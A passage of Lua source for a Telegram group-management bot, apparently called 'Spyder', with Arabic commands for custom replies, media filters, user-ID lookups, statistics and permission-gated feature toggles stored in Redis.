if msg.content_.photo_.sizes_[3] then
photo_in_group = msg.content_.photo_.sizes_[3].photo_.persistent_id_
end
redis:set('Spyder:'..bot_id.."Add:Rd:Sudo_bot:Photo"..test, photo_in_group)  
end
send(msg.chat_id_, msg.id_,'⌔︙ تم حفظ الرد بنجاح')
return false  
end  
end
if text and text:match("^(.*)$") then
if redis:get('Spyder:'..bot_id..'Set:Rd'..msg.sender_user_id_..':'..msg.chat_id_) == 'true' then
send(msg.chat_id_, msg.id_,'⌔︙ ارسل الرد الذي تريده سواء كان { متحركه ‹› ملصق ‹› صوره ‹› اغنيه ‹› بصمه ‹› ملف ‹› فيديو }')
redis:set('Spyder:'..bot_id..'Set:Rd'..msg.sender_user_id_..':'..msg.chat_id_, 'true1')
redis:set('Spyder:'..bot_id..'Text:Sudo_bot:Bot'..msg.sender_user_id_..':'..msg.chat_id_, text)
redis:sadd('Spyder:'..bot_id..'List:Rd:Sudo_bot', text)
return false end
end
if text and text:match("^(.*)$") then
if redis:get('Spyder:'..bot_id..'Set:On'..msg.sender_user_id_..':'..msg.chat_id_) == 'true' then
send(msg.chat_id_, msg.id_,'⌔︙ تم ازالة الرد من قائمه ردود المطور')
list = {"Add:Rd:Sudo_bot:Audio","Add:Rd:Sudo_bot:File","Add:Rd:Sudo_bot:Video","Add:Rd:Sudo_bot:Photo","Add:Rd:Sudo_bot:Text","Add:Rd:Sudo_bot:stekr","Add:Rd:Sudo_bot:vico","Add:Rd:Sudo_bot:Gif"}
for k,v in pairs(list) do
redis:del('Spyder:'..bot_id..v..text)
end
redis:del('Spyder:'..bot_id..'Set:On'..msg.sender_user_id_..':'..msg.chat_id_)
redis:srem('Spyder:'..bot_id..'List:Rd:Sudo_bot', text)
return false
end
end
----------------------------------------------------------
if text == 'اضف رد عام' and Sudo_id(msg) then 
send(msg.chat_id_, msg.id_,'⌔︙ ارسل الكلمه التي تريد اضافتها')
redis:set('Spyder:'..bot_id..'Set:Rd'..msg.sender_user_id_..':'..msg.chat_id_,true)
return false 
end
if text == 'حذف رد عام' and Sudo_id(msg) then 
send(msg.chat_id_, msg.id_,'⌔︙ ارسل الكلمه التي تريد اضافتها')
redis:set('Spyder:'..bot_id..'Set:On'..msg.sender_user_id_..':'..msg.chat_id_,true)
return false 
end
if text and not redis:get('Spyder:'..bot_id..'lock:Reply:Sudo_bot'..msg.chat_id_) then
if not redis:sismember('Spyder:'..bot_id..'Spam:Texting'..msg.sender_user_id_,text) then
local anemi = redis:get('Spyder:'..bot_id.."Add:Rd:Sudo_bot:Gif"..text)   
local veico = redis:get('Spyder:'..bot_id.."Add:Rd:Sudo_bot:vico"..text)   
local stekr = redis:get('Spyder:'..bot_id.."Add:Rd:Sudo_bot:stekr"..text)     
local text1 = redis:get('Spyder:'..bot_id.."Add:Rd:Sudo_bot:Text"..text)   
local photo = redis:get('Spyder:'..bot_id.."Add:Rd:Sudo_bot:Photo"..text)
local video = redis:get('Spyder:'..bot_id.."Add:Rd:Sudo_bot:Video"..text)
local document = redis:get('Spyder:'..bot_id.."Add:Rd:Sudo_bot:File"..text)
local audio = redis:get('Spyder:'..bot_id.."Add:Rd:Sudo_bot:Audio"..text)
------------------------------------------------------------------------
------------------------------------------------------------------------
if text1 then 
send(msg.chat_id_, msg.id_,text1)
redis:sadd('Spyder:'..bot_id..'Spam:Texting'..msg.sender_user_id_,text) 
end
if stekr then 
sendSticker(msg.chat_id_, msg.id_, 0, 1, nil, stekr)   
redis:sadd('Spyder:'..bot_id..'Spam:Texting'..msg.sender_user_id_,text) 
end
if veico then 
sendVoice(msg.chat_id_, msg.id_, 0, 1, nil, veico)   
redis:sadd('Spyder:'..bot_id..'Spam:Texting'..msg.sender_user_id_,text) 
end
if video then 
sendVideo(msg.chat_id_, msg.id_, 0, 1, nil,video)
redis:sadd('Spyder:'..bot_id..'Spam:Texting'..msg.sender_user_id_,text) 
end
if anemi then 
sendDocument(msg.chat_id_, msg.id_, 0, 1, nil, anemi, '', nil)  
redis:sadd('Spyder:'..bot_id..'Spam:Texting'..msg.sender_user_id_,text) 
end
if document then
sendDocument(msg.chat_id_, msg.id_, 0, 1,nil, document)   
redis:sadd('Spyder:'..bot_id..'Spam:Texting'..msg.sender_user_id_,text) 
end  
if audio then
sendAudio(msg.chat_id_,msg.id_,audio)  
redis:sadd('Spyder:'..bot_id..'Spam:Texting'..msg.sender_user_id_,text) 
end
if photo then
sendPhoto(msg.chat_id_, msg.id_, 0, 1, nil,photo,'')
redis:sadd('Spyder:'..bot_id..'Spam:Texting'..msg.sender_user_id_,text) 
end  
end
end
if text == ("مسح ردود المدير") and Owners(msg) then
local list = redis:smembers('Spyder:'..bot_id..'List:Owners'..msg.chat_id_..'')
for k,v in pairs(list) do
redis:del('Spyder:'..bot_id.."Add:Rd:Owners:Gif"..v..msg.chat_id_)   
redis:del('Spyder:'..bot_id.."Add:Rd:Owners:Vico"..v..msg.chat_id_)   
redis:del('Spyder:'..bot_id.."Add:Rd:Owners:Stekrs"..v..msg.chat_id_)     
redis:del('Spyder:'..bot_id.."Add:Rd:Owners:Text"..v..msg.chat_id_)   
redis:del('Spyder:'..bot_id.."Add:Rd:Owners:Photo"..v..msg.chat_id_)
redis:del('Spyder:'..bot_id.."Add:Rd:Owners:Video"..v..msg.chat_id_)
redis:del('Spyder:'..bot_id.."Add:Rd:Owners:File"..v..msg.chat_id_)
redis:del('Spyder:'..bot_id.."Add:Rd:Owners:Audio"..v..msg.chat_id_)
redis:del('Spyder:'..bot_id..'List:Owners'..msg.chat_id_)
end
send(msg.chat_id_, msg.id_,"⌔︙ تم مسح ردود المدير")
end
if text == ("ردود المدير") and Owners(msg) then
local list = redis:smembers('Spyder:'..bot_id..'List:Owners'..msg.chat_id_..'')
text = "⌔︙قائمه ردود المدير \n┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉\n"
for k,v in pairs(list) do
if redis:get('Spyder:'..bot_id.."Add:Rd:Owners:Gif"..v..msg.chat_id_) then
db = 'متحركه 🎭'
elseif redis:get('Spyder:'..bot_id.."Add:Rd:Owners:Vico"..v..msg.chat_id_) then
db = 'بصمه 📢'
elseif redis:get('Spyder:'..bot_id.."Add:Rd:Owners:Stekrs"..v..msg.chat_id_) then
db = 'ملصق 🃏'
elseif redis:get('Spyder:'..bot_id.."Add:Rd:Owners:Text"..v..msg.chat_id_) then
db = 'رساله ✉'
elseif redis:get('Spyder:'..bot_id.."Add:Rd:Owners:Photo"..v..msg.chat_id_) then
db = 'صوره 🎇'
elseif redis:get('Spyder:'..bot_id.."Add:Rd:Owners:Video"..v..msg.chat_id_) then
db = 'فيديو 📹'
elseif redis:get('Spyder:'..bot_id.."Add:Rd:Owners:File"..v..msg.chat_id_) then
db = 'ملف 📁'
elseif redis:get('Spyder:'..bot_id.."Add:Rd:Owners:Audio"..v..msg.chat_id_) then
db = 'اغنيه 🎵'
end
text = text..""..k.." >> ("..v..") ↫ {"..db.."}\n"
end
if #list == 0 then
text = "⌔︙ لا يوجد ردود للمدير"
end
send(msg.chat_id_, msg.id_,'['..text..']')
end
if text or msg.content_.sticker_ or msg.content_.voice_ or msg.content_.animation_ or msg.content_.audio_ or msg.content_.document_ or msg.content_.photo_ or msg.content_.video_ then  
local test = redis:get('Spyder:'..bot_id..'Text:Owners'..msg.sender_user_id_..':'..msg.chat_id_..'')
if redis:get('Spyder:'..bot_id..'Set:Owners:rd'..msg.sender_user_id_..':'..msg.chat_id_) == 'true1' then
redis:del('Spyder:'..bot_id..'Set:Owners:rd'..msg.sender_user_id_..':'..msg.chat_id_)
if msg.content_.sticker_ then   
redis:set('Spyder:'..bot_id.."Add:Rd:Owners:Stekrs"..test..msg.chat_id_, msg.content_.sticker_.sticker_.persistent_id_)  
end   
if msg.content_.voice_ then  
redis:set('Spyder:'..bot_id.."Add:Rd:Owners:Vico"..test..msg.chat_id_, msg.content_.voice_.voice_.persistent_id_)  
end   
if msg.content_.animation_ then   
redis:set('Spyder:'..bot_id.."Add:Rd:Owners:Gif"..test..msg.chat_id_, msg.content_.animation_.animation_.persistent_id_)  
end  
if text then   
text = text:gsub('"','') 
text = text:gsub("'",'') 
text = text:gsub('`','') 
text = text:gsub('*','') 
redis:set('Spyder:'..bot_id.."Add:Rd:Owners:Text"..test..msg.chat_id_, text)  
end  
if msg.content_.audio_ then
redis:set('Spyder:'..bot_id.."Add:Rd:Owners:Audio"..test..msg.chat_id_, msg.content_.audio_.audio_.persistent_id_)  
end
if msg.content_.document_ then
redis:set('Spyder:'..bot_id.."Add:Rd:Owners:File"..test..msg.chat_id_, msg.content_.document_.document_.persistent_id_)  
end
if msg.content_.video_ then
redis:set('Spyder:'..bot_id.."Add:Rd:Owners:Video"..test..msg.chat_id_, msg.content_.video_.video_.persistent_id_)  
end
if msg.content_.photo_ then
if msg.content_.photo_.sizes_[0] then
photo_in_group = msg.content_.photo_.sizes_[0].photo_.persistent_id_
end
if msg.content_.photo_.sizes_[1] then
photo_in_group = msg.content_.photo_.sizes_[1].photo_.persistent_id_
end
if msg.content_.photo_.sizes_[2] then
photo_in_group = msg.content_.photo_.sizes_[2].photo_.persistent_id_
end	
if msg.content_.photo_.sizes_[3] then
photo_in_group = msg.content_.photo_.sizes_[3].photo_.persistent_id_
end
redis:set('Spyder:'..bot_id.."Add:Rd:Owners:Photo"..test..msg.chat_id_, photo_in_group)  
end
send(msg.chat_id_, msg.id_,'⌔︙ تم حفظ الرد بنجاح')
return false  
end  
end
if text and text:match("^(.*)$") then
if redis:get('Spyder:'..bot_id..'Set:Owners:rd'..msg.sender_user_id_..':'..msg.chat_id_) == 'true' then
send(msg.chat_id_, msg.id_,'⌔︙ ارسل الرد الذي تريده سواء كان { متحركه ‹› ملصق ‹› صوره ‹› اغنيه ‹› بصمه ‹› ملف ‹› فيديو }')
redis:set('Spyder:'..bot_id..'Set:Owners:rd'..msg.sender_user_id_..':'..msg.chat_id_,'true1')
redis:set('Spyder:'..bot_id..'Text:Owners'..msg.sender_user_id_..':'..msg.chat_id_, text)
redis:del('Spyder:'..bot_id.."Add:Rd:Owners:Gif"..text..msg.chat_id_)   
redis:del('Spyder:'..bot_id.."Add:Rd:Owners:Vico"..text..msg.chat_id_)   
redis:del('Spyder:'..bot_id.."Add:Rd:Owners:Stekrs"..text..msg.chat_id_)     
redis:del('Spyder:'..bot_id.."Add:Rd:Owners:Text"..text..msg.chat_id_)   
redis:del('Spyder:'..bot_id.."Add:Rd:Owners:Photo"..text..msg.chat_id_)
redis:del('Spyder:'..bot_id.."Add:Rd:Owners:Video"..text..msg.chat_id_)
redis:del('Spyder:'..bot_id.."Add:Rd:Owners:File"..text..msg.chat_id_)
redis:del('Spyder:'..bot_id.."Add:Rd:Owners:Audio"..text..msg.chat_id_)
redis:sadd('Spyder:'..bot_id..'List:Owners'..msg.chat_id_..'', text)
return false end
end
if text and text:match("^(.*)$") then
if redis:get('Spyder:'..bot_id..'Set:Owners:rd'..msg.sender_user_id_..':'..msg.chat_id_..'') == 'true2' then
send(msg.chat_id_, msg.id_,'⌔︙ تم ازالة الرد من قائمه ردود المدير')
redis:del('Spyder:'..bot_id.."Add:Rd:Owners:Gif"..text..msg.chat_id_)   
redis:del('Spyder:'..bot_id.."Add:Rd:Owners:Vico"..text..msg.chat_id_)   
redis:del('Spyder:'..bot_id.."Add:Rd:Owners:Stekrs"..text..msg.chat_id_)     
redis:del('Spyder:'..bot_id.."Add:Rd:Owners:Text"..text..msg.chat_id_)   
redis:del('Spyder:'..bot_id.."Add:Rd:Owners:Photo"..text..msg.chat_id_)
redis:del('Spyder:'..bot_id.."Add:Rd:Owners:Video"..text..msg.chat_id_)
redis:del('Spyder:'..bot_id.."Add:Rd:Owners:File"..text..msg.chat_id_)
redis:del('Spyder:'..bot_id.."Add:Rd:Owners:Audio"..text..msg.chat_id_)
redis:del('Spyder:'..bot_id..'Set:Owners:rd'..msg.sender_user_id_..':'..msg.chat_id_)
redis:srem('Spyder:'..bot_id..'List:Owners'..msg.chat_id_..'', text)
return false
end
end
----------------------------------------------------------------------------
if text == 'اضف رد' and Owners(msg) then
send(msg.chat_id_, msg.id_,'⌔︙ ارسل الكلمه التري تريد اضافتها')
redis:set('Spyder:'..bot_id..'Set:Owners:rd'..msg.sender_user_id_..':'..msg.chat_id_,true)
return false 
end
if text == 'حذف رد' and Owners(msg) then
send(msg.chat_id_, msg.id_,'⌔︙ ارسل الكلمه التري تريد حذفها')
redis:set('Spyder:'..bot_id..'Set:Owners:rd'..msg.sender_user_id_..':'..msg.chat_id_,'true2')
return false 
end
if text and not redis:get('Spyder:'..bot_id..'Reply:Owners'..msg.chat_id_) then
if not redis:sismember('Spyder:'..bot_id..'Spam:Texting'..msg.sender_user_id_,text) then
local anemi = redis:get('Spyder:'..bot_id.."Add:Rd:Owners:Gif"..text..msg.chat_id_)   
local veico = redis:get('Spyder:'..bot_id.."Add:Rd:Owners:Vico"..text..msg.chat_id_)   
local stekr = redis:get('Spyder:'..bot_id.."Add:Rd:Owners:Stekrs"..text..msg.chat_id_)     
local text1 = redis:get('Spyder:'..bot_id.."Add:Rd:Owners:Text"..text..msg.chat_id_)   
local photo = redis:get('Spyder:'..bot_id.."Add:Rd:Owners:Photo"..text..msg.chat_id_)
local video = redis:get('Spyder:'..bot_id.."Add:Rd:Owners:Video"..text..msg.chat_id_)
local document = redis:get('Spyder:'..bot_id.."Add:Rd:Owners:File"..text..msg.chat_id_)
local audio = redis:get('Spyder:'..bot_id.."Add:Rd:Owners:Audio"..text..msg.chat_id_)
------------------------------------------------------------------------
------------------------------------------------------------------------
if text1 then 
send(msg.chat_id_, msg.id_, text1)
redis:sadd('Spyder:'..bot_id..'Spam:Texting'..msg.sender_user_id_,text) 
end
if stekr then 
sendSticker(msg.chat_id_, msg.id_, 0, 1, nil, stekr)   
redis:sadd('Spyder:'..bot_id..'Spam:Texting'..msg.sender_user_id_,text) 
end
if veico then 
sendVoice(msg.chat_id_, msg.id_, 0, 1, nil, veico)   
redis:sadd('Spyder:'..bot_id..'Spam:Texting'..msg.sender_user_id_,text) 
end
if video then 
sendVideo(msg.chat_id_, msg.id_, 0, 1, nil,video)
redis:sadd('Spyder:'..bot_id..'Spam:Texting'..msg.sender_user_id_,text) 
end
if anemi then 
sendDocument(msg.chat_id_, msg.id_, 0, 1,nil, anemi)   
redis:sadd('Spyder:'..bot_id..'Spam:Texting'..msg.sender_user_id_,text) 
end
if document then
sendDocument(msg.chat_id_, msg.id_, 0, 1,nil, document)   
redis:sadd('Spyder:'..bot_id..'Spam:Texting'..msg.sender_user_id_,text) 
end  
if audio then
sendAudio(msg.chat_id_,msg.id_,audio)  
redis:sadd('Spyder:'..bot_id..'Spam:Texting'..msg.sender_user_id_,text) 
end
if photo then
sendPhoto(msg.chat_id_, msg.id_, 0, 1, nil,photo,photo_caption)
redis:sadd('Spyder:'..bot_id..'Spam:Texting'..msg.sender_user_id_,text) 
end  
end
end
----------------------------------------------------------------------------
if text == ""..(redis:get('Spyder:'..bot_id..'Name:Bot') or 'العالمي').." غادر" or text == 'غادر' then  
if Sudo_bot(msg) and not redis:get('Spyder:'..bot_id..'Left:Bot'..msg.chat_id_)  then 
tdcli_function ({ID = "ChangeChatMemberStatus",chat_id_=msg.chat_id_,user_id_=bot_id,status_={ID = "ChatMemberStatusLeft"},},function(e,g) end, nil) 
send(msg.chat_id_, msg.id_,'⌔︙تم مغادرة المجموعه') 
redis:srem('Spyder:'..bot_id..'Groups_Users',msg.chat_id_)  
end
return false  
end
if text == 'بوت' then
Namebot = (redis:get('Spyder:'..bot_id..'Name:Bot') or 'العالمي')
send(msg.chat_id_, msg.id_,'كول ['..Namebot..'] 🌠') 
end
----------------------------------------------------------------------------
if text == 'الاحصائيات' or text == 'المجموعات' or text == 'المشتركين' then
if Sudo_bot(msg) then 
local Groups = redis:scard('Spyder:'..bot_id..'Groups_Users')  
local Users = redis:scard('Spyder:'..bot_id..'Users:ids')  
Text = '⌔︙ الاحصائيات : \n\n'..'⌔︙ عدد المجموعات المفعله : {'..Groups..'}'..'\n⌔︙ عدد المشتركين في البوت : {'..Users..'}'
send(msg.chat_id_, msg.id_,Text) 
end
return false
end
----------------------------------------------------------------------------
if text == 'تفعيل المغادره' and Owners(msg) then  
send(msg.chat_id_, msg.id_, '⌔︙بواسطة :  ['..Get_Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'Spyder')..')\n⌔︙ تم تفعيل المغادره')
redis:del('Spyder:'..bot_id..'Left:Bot'..msg.chat_id_)
end
if text == 'تعطيل المغادره' and Owners(msg) then  
send(msg.chat_id_, msg.id_, '⌔︙بواسطة :  ['..Get_Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'Spyder')..')\n⌔︙ تم تعطيل المغادره')
redis:set('Spyder:'..bot_id..'Left:Bot'..msg.chat_id_, true)
end
----------------------------------------------------------------------------
if text == 'تفعيل ردود المدير' and Owners(msg) then  
send(msg.chat_id_, msg.id_, '⌔︙بواسطة :  ['..Get_Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'Spyder')..')\n⌔︙ تم تفعيل ردود المدير')
redis:del('Spyder:'..bot_id..'Reply:Owners'..msg.chat_id_)
end
if text == 'تعطيل ردود المدير' and Owners(msg) then  
send(msg.chat_id_, msg.id_, '⌔︙بواسطة :  ['..Get_Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'Spyder')..')\n⌔︙ تم تعطيل ردود المدير')
redis:set('Spyder:'..bot_id..'Reply:Owners'..msg.chat_id_, true)
end
----------------------------------------------------------------------------
if text == 'تفعيل ردود المطور' and Owners(msg) then  
send(msg.chat_id_, msg.id_, '⌔︙بواسطة :  ['..Get_Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'Spyder')..')\n⌔︙ تم تفعيل ردود المطور')
redis:del('Spyder:'..bot_id..'lock:Reply:Sudo_bot'..msg.chat_id_)
end
if text == 'تعطيل ردود المطور' and Owners(msg) then  
send(msg.chat_id_, msg.id_, '⌔︙بواسطة :  ['..Get_Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'Spyder')..')\n⌔︙ تم تعطيل ردود المطور')
redis:set('Spyder:'..bot_id..'lock:Reply:Sudo_bot'..msg.chat_id_, true)
end
----------------------------------------------------------------------------
if text == 'تفعيل الايدي' and Owners(msg) then  
send(msg.chat_id_, msg.id_, '⌔︙بواسطة :  ['..Get_Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'Spyder')..')\n⌔︙ تم تفعيل الايدي')
redis:del('Spyder:'..bot_id..'lock:id'..msg.chat_id_)
end
if text == 'تعطيل الايدي' and Owners(msg) then  
send(msg.chat_id_, msg.id_, '⌔︙بواسطة :  ['..Get_Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'Spyder')..')\n⌔︙ تم تعطيل الايدي')
redis:set('Spyder:'..bot_id..'lock:id'..msg.chat_id_, true)
end
----------------------------------------------------------------------------
if text == 'تفعيل الايدي بالصوره' and Owners(msg) then  
send(msg.chat_id_, msg.id_, '⌔︙بواسطة :  ['..Get_Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'Spyder')..')\n⌔︙ تم تفعيل الايدي بالصوره')
redis:del('Spyder:'..bot_id..'lock:id:Photo'..msg.chat_id_)
end
if text == 'تعطيل الايدي بالصوره' and Owners(msg) then  
send(msg.chat_id_, msg.id_, '⌔︙بواسطة :  ['..Get_Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'Spyder')..')\n⌔︙ تم تعطيل الايدي بالصوره')
redis:set('Spyder:'..bot_id..'lock:id:Photo'..msg.chat_id_, true)
end
----------------------------------------------------------------------------
if text == 'تفعيل الحظر' or text == 'تفعيل الطرد' and Constructor(msg) then  
send(msg.chat_id_, msg.id_, '⌔︙بواسطة :  ['..Get_Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'Spyder')..')\n⌔︙تم تفعيل - ( الحظر - الطرد ) ')
redis:del('Spyder:'..bot_id..'Lock:kick'..msg.chat_id_)
end
if text == 'تعطيل الحظر' or text == 'تعطيل الطرد' and Constructor(msg) then  
send(msg.chat_id_, msg.id_, '⌔︙بواسطة :  ['..Get_Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'Spyder')..')\n⌔︙تم تعطيل - ( الحظر - الطرد ) ')
redis:set('Spyder:'..bot_id..'Lock:kick'..msg.chat_id_, true)
end
----------------------------------------------------------------------------
if text == 'تفعيل الرفع' and Constructor(msg) then  
send(msg.chat_id_, msg.id_, '⌔︙بواسطة :  ['..Get_Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'Spyder')..')\n⌔︙ تم تفعيل الرفع')
redis:del('Spyder:'..bot_id..'Lock:Add:Bot'..msg.chat_id_)
end
if text == 'تعطيل الرفع' and Constructor(msg) then  
send(msg.chat_id_, msg.id_, '⌔︙بواسطة :  ['..Get_Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'Spyder')..')\n⌔︙ تم تعطيل الرفع')
redis:set('Spyder:'..bot_id..'Lock:Add:Bot'..msg.chat_id_, true)
end
----------------------------------------------------------------------------
if text == 'ايدي' and tonumber(msg.reply_to_message_id_) > 0 and not redis:get(bot_id..'lock:id'..msg.chat_id_) then
function start_function(extra, result, success)
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(extra,data) 
if data.first_name_ == false then
send(msg.chat_id_, msg.id_,'⌔︙ الحساب محذوف لا توجد معلوماته ')
return false
end
if data.username_ then
username = '@'..data.username_
else
username = 'لا يوجد'
end
local Id = data.id_
local Msguser = tonumber(redis:get('Spyder:'..bot_id..'Msg_User'..msg.chat_id_..':'..result.sender_user_id_) or 1) 
local Contact = tonumber(redis:get('Spyder:'..bot_id..'Add:Contact'..msg.chat_id_..':'..result.sender_user_id_) or 0) 
local NUMPGAME = tonumber(redis:get('Spyder:'..bot_id..'NUM:GAMES'..msg.chat_id_..result.sender_user_id_) or 0)
local edit = tonumber(redis:get('Spyder:'..bot_id..'edits'..msg.chat_id_..result.sender_user_id_) or 0)
local rtp = Get_Rutba(result.sender_user_id_,msg.chat_id_)
local iduser = result.sender_user_id_
send(msg.chat_id_, msg.id_,'⌔︙ ايديه ↫ ('..iduser..')\n⌔︙ معرفه ↫ ['..username..']\n⌔︙ رتبته ↫ ('..rtp..')\n⌔︙ سحكاته ↫ ('..edit..')\n⌔︙ نقاطه ↫ ('..NUMPGAME..')\n⌔︙ جهاته ↫ ('..Contact..')\n⌔︙ رسائله ↫ ('..Msguser..')')
end,nil)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
end
if text and text:match("^ايدي @(.*)$") and not redis:get(bot_id..'lock:id'..msg.chat_id_) then
local username = text:match("^ايدي @(.*)$")
function start_function(extra, result, success)
if result.id_ then
tdcli_function ({ID = "GetUser",user_id_ = result.id_},function(extra,data) 
if data.username_ then
username = '@'..data.username_
else
username = 'لا يوجد'
end
local Id = data.id_
local Msguser = tonumber(redis:get('Spyder:'..bot_id..'Msg_User'..msg.chat_id_..':'..result.id_) or 1) 
local Contact = tonumber(redis:get('Spyder:'..bot_id..'Add:Contact'..msg.chat_id_..':'..result.id_) or 0) 
local NUMPGAME = tonumber(redis:get('Spyder:'..bot_id..'NUM:GAMES'..msg.chat_id_..result.id_) or 0)
local edit = tonumber(redis:get('Spyder:'..bot_id..'edits'..msg.chat_id_..result.id_) or 0)
local rtp = Get_Rutba(result.id_,msg.chat_id_)
local iduser = result.id_
send(msg.chat_id_, msg.id_,'⌔︙ ايديه - ('..iduser..')\n⌔︙ معرفه - ['..username..']\n⌔︙ رتبته - ('..rtp..')\n⌔︙ سحكاته - ('..edit..')\n⌔︙ نقاطه - ('..NUMPGAME..')\n⌔︙ جهاته - ('..Contact..')\n⌔︙ رسائله - ('..Msguser..')')
end,nil)
else
send(msg.chat_id_, msg.id_,'⌔︙ المعرف غير صحيح ')
end
end
tdcli_function ({ID = "SearchPublicChat",username_ = username}, start_function, nil)
end
---------
if text == 'منع' and tonumber(msg.reply_to_message_id_) > 0 and Owners(msg) then     
function cb(a,b,c) 
textt = '⌔︙تم منع '
if b.content_.sticker_ then
local idsticker = b.content_.sticker_.set_id_
redis:sadd('Spyder:'..bot_id.."filtersteckr"..msg.chat_id_,idsticker)
text = 'الملصق'
send(msg.chat_id_, msg.id_,textt..'( '..text..' ) عذراً لن تتمكن من ارسالها مجددا')  
return false
end
if b.content_.ID == "MessagePhoto" then
local photo = b.content_.photo_.id_
redis:sadd('Spyder:'..bot_id.."filterphoto"..msg.chat_id_,photo)
text = 'الصوره'
send(msg.chat_id_, msg.id_,textt..'( '..text..' ) عذراً لن تتمكن من ارسالها مجددا')  
return false
end
if b.content_.animation_.animation_ then
local idanimation = b.content_.animation_.animation_.persistent_id_
redis:sadd('Spyder:'..bot_id.."filteranimation"..msg.chat_id_,idanimation)
text = 'المتحركه'
send(msg.chat_id_, msg.id_,textt..'( '..text..' ) عذراً لن تتمكن من ارسالها مجددا')  
return false
end
end
tdcli_function ({ ID = "GetMessage", chat_id_ = msg.chat_id_, message_id_ = tonumber(msg.reply_to_message_id_) }, cb, nil)
end
if text == 'الغاء منع' and tonumber(msg.reply_to_message_id_) > 0 and Owners(msg) then     
function cb(a,b,c) 
textt = '⌔︙تم الغاء منع '
if b.content_.sticker_ then
local idsticker = b.content_.sticker_.set_id_
redis:srem('Spyder:'..bot_id.."filtersteckr"..msg.chat_id_,idsticker)
text = 'الملصق'
send(msg.chat_id_, msg.id_,textt..'( '..text..' ) بنجاح يمكنهم الارسال الان')  
return false
end
if b.content_.ID == "MessagePhoto" then
local photo = b.content_.photo_.id_
redis:srem('Spyder:'..bot_id.."filterphoto"..msg.chat_id_,photo)
text = 'الصوره'
send(msg.chat_id_, msg.id_,textt..'( '..text..' ) بنجاح يمكنهم الارسال الان')  
return false
end
if b.content_.animation_.animation_ then
local idanimation = b.content_.animation_.animation_.persistent_id_
redis:srem('Spyder:'..bot_id.."filteranimation"..msg.chat_id_,idanimation)
text = 'المتحركه'
send(msg.chat_id_, msg.id_,textt..'( '..text..' ) بنجاح يمكنهم الارسال الان')  
return false
end
end
tdcli_function ({ ID = "GetMessage", chat_id_ = msg.chat_id_, message_id_ = tonumber(msg.reply_to_message_id_) }, cb, nil)
end
if text == 'مسح قائمه منع المتحركات' and Owners(msg) then     
redis:del('Spyder:'..bot_id.."filteranimation"..msg.chat_id_)
send(msg.chat_id_, msg.id_,'⌔︙تم مسح قائمه منع المتحركات')  
end
if text == 'مسح قائمه منع الصور' and Owners(msg) then     
redis:del('Spyder:'..bot_id.."filterphoto"..msg.chat_id_)
send(msg.chat_id_, msg.id_,'⌔︙تم مسح قائمه منع الصور')  
end
if text == 'مسح قائمه منع الملصقات' and Owners(msg) then     
redis:del('Spyder:'..bot_id.."filtersteckr"..msg.chat_id_)
send(msg.chat_id_, msg.id_,'⌔︙تم مسح قائمه منع الملصقات')  
end
----------------------------------------------------------------------------
if text == 'رتبتي' then
local rtp = Get_Rutba(msg.sender_user_id_,msg.chat_id_)
send(msg.chat_id_, msg.id_,'⌔︙ رتبتك ↫ '..rtp)
end
----------------------------------------------------------------------------
if text == 'ايديي' then
send(msg.chat_id_, msg.id_,'⌔︙ ايديك ↫ '..msg.sender_user_id_)
end
----------------------------------------------
if text == 'كشف' and tonumber(msg.reply_to_message_id_) > 0 and not redis:get(bot_id..'lock:id'..msg.chat_id_) then
function start_function(extra, result, success)
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(extra,data) 
if data.first_name_ == false then
send(msg.chat_id_, msg.id_,'⌔︙ الحساب محذوف لا توجد معلوماته ')
return false
end
if data.username_ then
username = '@'..data.username_
else
username = 'لا يوجد'
end
local Id = data.id_
local rtp = Get_Rutba(result.sender_user_id_,msg.chat_id_)
local username = '@'..(data.username_ or 'لا يوجد')
local iduser = result.sender_user_id_
send(msg.chat_id_, msg.id_,'⌔︙ الايدي ↫ ('..iduser..')\n⌔︙ المعرف ↫ ('..username..')\n⌔︙ الرتبه ↫ ('..rtp..')\n⌔︙ نوع الكشف ↫ بالرد')
end,nil)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
end
---------
if text and text:match("^كشف @(.*)$") and not redis:get(bot_id..'lock:id'..msg.chat_id_) then
local username = text:match("^كشف @(.*)$")
function start_function(extra, result, success)
if result.id_ then
tdcli_function ({ID = "GetUser",user_id_ = result.id_},function(extra,data) 
if data.username_ then
username = '@'..data.username_
else
username = 'لا يوجد'
end
local Id = data.id_
local rtp = Get_Rutba(result.id_,msg.chat_id_)
local iduser = result.id_
send(msg.chat_id_, msg.id_,'⌔︙ الايدي - ('..iduser..')\n⌔︙ المعرف - ['..username..']\n⌔︙ الرتبه - ('..rtp..')\n⌔︙ نوع الكشف ↫ بالمعرف')
end,nil)
else
send(msg.chat_id_, msg.id_,'⌔︙ المعرف غير صحيح ')
end
end
tdcli_function ({ID = "SearchPublicChat",username_ = username}, start_function, nil)
end
----------------------------------------------------------------------------
if text==('عدد الكروب') and Mod(msg) then  
if msg.can_be_deleted_ == false then 
send(msg.chat_id_,msg.id_,"⌔︙البوت ليس ادمن بالمجموعة \n") 
return false  
end 
